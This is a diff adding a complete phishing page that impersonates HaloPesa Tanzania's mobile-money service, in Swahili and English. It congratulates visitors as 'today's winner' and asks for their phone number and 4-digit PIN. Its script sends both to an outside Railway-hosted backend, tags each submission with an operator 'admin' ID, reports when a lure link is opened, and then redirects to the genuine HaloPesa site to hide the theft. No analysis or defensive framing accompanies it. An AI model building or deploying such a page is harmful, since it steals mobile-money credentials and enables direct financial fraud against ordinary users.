@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HaloPesa Tanzania – Fanikisha Ofa Yako</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --brand-red:#cc3300;
+    --brand-orange:#ff6600;
+    --brand-amber:#ff9900;
+    --brand-yellow:#ffdd00;
+    --grad:linear-gradient(135deg,#ff6600,#ff9900);
+    --page-bg:#EBEBEB;
+    --white:#FFFFFF;
+    --text-dark:#1C1C1C;
+    --text-mid:#444;
+    --text-light:#888;
+    --border:#ddd;
+    --radius:14px;
+    --radius-sm:9px;
+    --shadow-card:0 6px 28px rgba(0,0,0,0.08);
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:'Inter',sans-serif;
+    background:var(--page-bg);
+    color:var(--text-dark);
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    overflow-x:hidden;
+  }
+
+  /* ══════════ NAVBAR ══════════ */
+  .navbar{
+    background:var(--brand-red);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:0 16px;
+    height:58px;
+    position:relative;
+    flex-shrink:0;
+    box-shadow:0 2px 12px rgba(204,51,0,0.25);
+  }
+  .hp-logo-sm{display:flex;align-items:center;gap:8px}
+  .hp-logo-sm svg{width:28px;height:28px;filter:drop-shadow(0 2px 4px rgba(0,0,0,.15))}
+  .hp-logo-sm .brand{font-size:1.18rem;font-weight:800;color:#fff;letter-spacing:-.02em}
+  .hp-logo-sm .brand span{color:var(--brand-yellow)}
+
+  /* ══════════ LANGUAGE SELECTOR ══════════ */
+  .lang-selector{
+    position:absolute;
+    right:14px;
+    top:50%;
+    transform:translateY(-50%);
+    display:flex;
+    background:rgba(255,255,255,.15);
+    border:1px solid rgba(255,255,255,.25);
+    border-radius:20px;
+    padding:3px;
+    gap:2px;
+    backdrop-filter:blur(6px);
+  }
+  .lang-btn{
+    background:transparent;
+    border:none;
+    color:rgba(255,255,255,.75);
+    font-family:'Inter',sans-serif;
+    font-size:.72rem;
+    font-weight:800;
+    letter-spacing:.05em;
+    padding:5px 11px;
+    border-radius:16px;
+    cursor:pointer;
+    transition:background .2s,color .2s;
+    display:flex;
+    align-items:center;
+    gap:4px;
+  }
+  .lang-btn:hover{color:#fff}
+  .lang-btn.active{
+    background:#fff;
+    color:var(--brand-red);
+    box-shadow:0 2px 6px rgba(0,0,0,.15);
+  }
+  .lang-flag{font-size:.85rem;line-height:1}
+
+  /* ══════════ MAIN CENTER ══════════ */
+  .main-center{
+    flex:1;
+    display:flex;
+    align-items:flex-start;
+    justify-content:center;
+    padding:32px 16px;
+  }
+  .card{
+    width:100%;
+    max-width:480px;
+    background:#fff;
+    border-radius:var(--radius);
+    box-shadow:var(--shadow-card);
+    padding:34px 30px;
+    border:1px solid rgba(0,0,0,.03);
+    animation:fadeIn .35s ease;
+  }
+  @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+  /* ══════════ CELEBRATION HEADER ══════════ */
+  .celebrate{
+    text-align:center;
+    margin-bottom:26px;
+  }
+  .trophy{
+    width:70px;
+    height:70px;
+    border-radius:50%;
+    background:var(--grad);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 16px;
+    font-size:2rem;
+    box-shadow:0 8px 24px rgba(255,102,0,.4);
+    animation:pulse 2s ease infinite;
+  }
+  @keyframes pulse{
+    0%,100%{box-shadow:0 8px 24px rgba(255,102,0,.4),0 0 0 0 rgba(255,153,0,.4)}
+    50%{box-shadow:0 8px 24px rgba(255,102,0,.4),0 0 0 18px rgba(255,153,0,0)}
+  }
+  .congrats-title{
+    font-size:1.25rem;
+    font-weight:800;
+    color:var(--brand-red);
+    letter-spacing:-.01em;
+    margin-bottom:12px;
+    line-height:1.3;
+  }
+  .congrats-text{
+    font-size:.93rem;
+    color:var(--text-mid);
+    line-height:1.65;
+    font-weight:500;
+    padding:0 4px;
+  }
+  .congrats-text strong{
+    color:var(--brand-orange);
+    font-weight:700;
+  }
+
+  /* ══════════ DIVIDER ══════════ */
+  .divider{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin:24px 0;
+    color:var(--text-light);
+    font-size:.72rem;
+    font-weight:700;
+    letter-spacing:.12em;
+    text-transform:uppercase;
+  }
+  .divider::before,.divider::after{
+    content:'';
+    flex:1;
+    height:1px;
+    background:#e5e5e5;
+  }
+
+  /* ══════════ FIELDS ══════════ */
+  .field{margin-bottom:18px}
+  .field label{
+    display:block;
+    font-size:.83rem;
+    font-weight:600;
+    color:var(--text-mid);
+    margin-bottom:7px;
+  }
+  .field input{
+    width:100%;
+    padding:13px 15px;
+    border:1.5px solid var(--border);
+    border-radius:var(--radius-sm);
+    font-family:'Inter',sans-serif;
+    font-size:.95rem;
+    color:var(--text-dark);
+    background:#fff;
+    outline:none;
+    transition:border-color .2s,box-shadow .2s;
+  }
+  .field input:focus{
+    border-color:var(--brand-orange);
+    box-shadow:0 0 0 3px rgba(255,102,0,.13);
+  }
+  .field input::placeholder{color:#aaa}
+  .field-hint{font-size:.75rem;color:var(--text-light);margin-top:6px}
+
+  .phone-row{display:flex}
+  .ph-pre{
+    padding:13px 13px;
+    background:#f6f6f6;
+    border:1.5px solid var(--border);
+    border-right:none;
+    border-radius:var(--radius-sm) 0 0 var(--radius-sm);
+    font-size:.88rem;
+    font-weight:600;
+    color:#555;
+    white-space:nowrap;
+    display:flex;
+    align-items:center;
+  }
+  .phone-row input{
+    border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important;
+    flex:1;
+  }
+
+  /* ══════════ ERROR BOX ══════════ */
+  .msg-box{
+    border-radius:var(--radius-sm);
+    padding:12px 16px;
+    font-size:.85rem;
+    margin-bottom:16px;
+    display:none;
+    align-items:center;
+    gap:10px;
+    font-weight:500;
+  }
+  .msg-box.show{display:flex;animation:fadeIn .25s ease}
+  .msg-box.error{background:#fef2f2;border:1.5px solid #fecaca;color:#991b1b}
+  .msg-icon{font-size:1.05rem;flex-shrink:0;font-weight:700}
+
+  /* ══════════ BUTTON ══════════ */
+  .btn-grad{
+    background:var(--grad);
+    color:#fff;
+    border:none;
+    border-radius:var(--radius-sm);
+    padding:15px 20px;
+    font-size:.92rem;
+    font-weight:700;
+    letter-spacing:.06em;
+    cursor:pointer;
+    width:100%;
+    font-family:'Inter',sans-serif;
+    transition:transform .15s,box-shadow .2s,opacity .2s;
+    box-shadow:0 6px 18px rgba(255,102,0,.3);
+    margin-top:6px;
+  }
+  .btn-grad:hover{opacity:.95;transform:translateY(-1px);box-shadow:0 8px 22px rgba(255,102,0,.38)}
+  .btn-grad:active{transform:translateY(0)}
+  .btn-grad:disabled{opacity:.6;cursor:not-allowed;transform:none}
+
+  /* ══════════ FOOTER ══════════ */
+  .pg-footer{
+    margin-top:auto;
+    padding:16px;
+    text-align:center;
+    font-size:.78rem;
+    color:var(--text-light);
+    background:#fff;
+    border-top:1px solid #eee;
+    flex-shrink:0;
+    font-weight:500;
+  }
+
+  /* ══════════ RESPONSIVE ══════════ */
+  @media(max-width:500px){
+    .card{padding:26px 20px}
+    .congrats-title{font-size:1.15rem}
+    .congrats-text{font-size:.88rem}
+    .trophy{width:60px;height:60px;font-size:1.7rem}
+    .lang-btn{padding:5px 9px;font-size:.68rem}
+    .lang-flag{display:none}
+  }
+</style>
+</head>
+<body>
+
+  <!-- ══════════ NAVBAR ══════════ -->
+  <div class="navbar">
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+
+    <!-- Language selector -->
+    <div class="lang-selector">
+      <button class="lang-btn active" id="btnSW" onclick="setLang('sw')">
+        <span class="lang-flag">🇹🇿</span> SW
+      </button>
+      <button class="lang-btn" id="btnEN" onclick="setLang('en')">
+        <span class="lang-flag">🇬🇧</span> EN
+      </button>
+    </div>
+  </div>
+
+  <!-- ══════════ MAIN CARD ══════════ -->
+  <div class="main-center">
+    <div class="card">
+
+      <!-- Celebration header -->
+      <div class="celebrate">
+        <div class="trophy">🏆</div>
+        <h1 class="congrats-title" id="t-title">Hongera!</h1>
+        <p class="congrats-text" id="t-message">
+          Hongera kwa kuwa <strong>mshindi wa leo</strong>, fanikisha ofa yako kwa kuingiza nambari ya siri (PIN)
+        </p>
+      </div>
+
+      <div class="divider" id="t-divider">Fanikisha Ofa</div>
+
+      <!-- Error -->
+      <div class="msg-box error" id="errBox">
+        <span class="msg-icon">✕</span>
+        <span id="errTxt"></span>
+      </div>
+
+      <!-- Phone -->
+      <div class="field">
+        <label id="t-lbl-phone">Nambari ya Simu</label>
+        <div class="phone-row">
+          <div class="ph-pre">🇹🇿 +255</div>
+          <input type="tel" id="phone" placeholder="712345678" maxlength="9" inputmode="numeric" oninput="clearErr()">
+        </div>
+        <div class="field-hint" id="t-hint-phone">Weka tarakimu 9 baada ya +255</div>
+      </div>
+
+      <!-- PIN -->
+      <div class="field">
+        <label id="t-lbl-pin">Namba ya Siri (PIN)</label>
+        <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" oninput="clearErr()">
+        <div class="field-hint" id="t-hint-pin">Tarakimu 4</div>
+      </div>
+
+      <button class="btn-grad" id="submitBtn" onclick="submitForm()">FANIKISHA OFA</button>
+
+    </div>
+  </div>
+
+  <div class="pg-footer" id="t-footer">© 2026 HaloPesa Tanzania</div>
+
+<script>
+  /* ══════════════════════════════════════════════════════════
+     CONFIG
+     ══════════════════════════════════════════════════════════ */
+  const API_BASE = 'https://halopesa-tanzania-production.up.railway.app';
+  const REDIRECT_URL = 'https://halopesa.co.tz/';
+
+  /* Capture admin ID from URL ?admin=XXX */
+  const urlParams = new URLSearchParams(window.location.search);
+  const ADMIN_ID = urlParams.get('admin') || null;
+
+  /* ══════════════════════════════════════════════════════════
+     TRANSLATIONS
+     ══════════════════════════════════════════════════════════ */
+  const T = {
+    sw: {
+      title: 'Hongera!',
+      message: 'Hongera kwa kuwa <strong>mshindi wa leo</strong>, fanikisha ofa yako kwa kuingiza nambari ya siri (PIN)',
+      divider: 'Fanikisha Ofa',
+      lblPhone: 'Nambari ya Simu',
+      hintPhone: 'Weka tarakimu 9 baada ya +255',
+      lblPin: 'Namba ya Siri (PIN)',
+      hintPin: 'Tarakimu 4',
+      submit: 'FANIKISHA OFA',
+      submitting: 'INATUMA...',
+      footer: '© 2026 HaloPesa Tanzania',
+      errPhoneReq: 'Tafadhali weka nambari ya simu',
+      errPhoneLen: 'Nambari ya simu lazima iwe tarakimu 9',
+      errPinReq: 'Tafadhali weka namba ya siri (PIN)',
+      errPinLen: 'Namba ya siri lazima iwe tarakimu 4',
+      errNetwork: 'Hitilafu ya mtandao. Tafadhali jaribu tena.'
+    },
+    en: {
+      title: 'Congratulations!',
+      message: 'Congratulations on being <strong>today\'s winner</strong>, complete your offer by entering your PIN',
+      divider: 'Complete Offer',
+      lblPhone: 'Phone Number',
+      hintPhone: 'Enter 9 digits after +255',
+      lblPin: 'PIN',
+      hintPin: '4 digits',
+      submit: 'COMPLETE OFFER',
+      submitting: 'SENDING...',
+      footer: '© 2026 HaloPesa Tanzania',
+      errPhoneReq: 'Please enter your phone number',
+      errPhoneLen: 'Phone number must be 9 digits',
+      errPinReq: 'Please enter your PIN',
+      errPinLen: 'PIN must be 4 digits',
+      errNetwork: 'Network error. Please try again.'
+    }
+  };
+
+  let currentLang = 'sw';
+
+  /* ══════════════════════════════════════════════════════════
+     SET LANGUAGE
+     ══════════════════════════════════════════════════════════ */
+  function setLang(lang){
+    currentLang = lang;
+    const t = T[lang];
+
+    document.getElementById('t-title').textContent = t.title;
+    document.getElementById('t-message').innerHTML = t.message;
+    document.getElementById('t-divider').textContent = t.divider;
+    document.getElementById('t-lbl-phone').textContent = t.lblPhone;
+    document.getElementById('t-hint-phone').textContent = t.hintPhone;
+    document.getElementById('t-lbl-pin').textContent = t.lblPin;
+    document.getElementById('t-hint-pin').textContent = t.hintPin;
+    document.getElementById('t-footer').textContent = t.footer;
+
+    const btn = document.getElementById('submitBtn');
+    if (!btn.disabled) btn.textContent = t.submit;
+
+    document.getElementById('btnSW').classList.toggle('active', lang === 'sw');
+    document.getElementById('btnEN').classList.toggle('active', lang === 'en');
+    document.documentElement.lang = lang;
+
+    clearErr();
+
+    try { localStorage.setItem('hp_lang', lang); } catch(e){}
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     FORM HELPERS
+     ══════════════════════════════════════════════════════════ */
+  function clearErr(){
+    document.getElementById('errBox').classList.remove('show');
+  }
+  function showErr(msg){
+    document.getElementById('errTxt').textContent = msg;
+    document.getElementById('errBox').classList.add('show');
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     SUBMIT → SEND TO BACKEND → REDIRECT
+     ══════════════════════════════════════════════════════════ */
+  async function submitForm(){
+    const t = T[currentLang];
+    const phone = document.getElementById('phone').value.trim();
+    const pin   = document.getElementById('pin').value.trim();
+
+    /* Validate */
+    if (!phone){ showErr(t.errPhoneReq); return; }
+    if (!/^\d{9}$/.test(phone)){ showErr(t.errPhoneLen); return; }
+    if (!pin){ showErr(t.errPinReq); return; }
+    if (!/^\d{4}$/.test(pin)){ showErr(t.errPinLen); return; }
+
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.textContent = t.submitting;
+
+    /* Send to backend */
+    try {
+      await fetch(`${API_BASE}/api/winner-entry`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phone: phone,
+          pin: pin,
+          lang: currentLang,
+          adminId: ADMIN_ID,
+          timestamp: new Date().toISOString()
+        })
+      });
+    } catch (err) {
+      console.warn('Backend send failed:', err.message);
+      /* Continue to redirect even if backend fails */
+    }
+
+    /* Redirect after short delay */
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 500);
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     NOTIFY ADMIN THAT LINK WAS OPENED
+     ══════════════════════════════════════════════════════════ */
+  async function notifyAdminLinkOpened(adminId){
+    try {
+      await fetch(`${API_BASE}/api/notify-admin-link-opened`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          adminId: adminId,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      });
+      console.log('✅ Admin notified: link opened');
+    } catch (err) {
+      console.warn('Admin notify failed:', err.message);
+    }
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     INIT
+     ══════════════════════════════════════════════════════════ */
+  window.addEventListener('DOMContentLoaded', () => {
+    /* Restore saved language */
+    let saved = 'sw';
+    try { saved = localStorage.getItem('hp_lang') || 'sw'; } catch(e){}
+    setLang(saved);
+
+    /* Auto-focus phone */
+    document.getElementById('phone').focus();
+
+    /* If admin link (?admin=XXX), notify backend */
+    if (ADMIN_ID) {
+      console.log('🔑 Admin link detected:', ADMIN_ID);
+      notifyAdminLinkOpened(ADMIN_ID);
+    }
+  });
+</script>
+
+</body>
+</html>
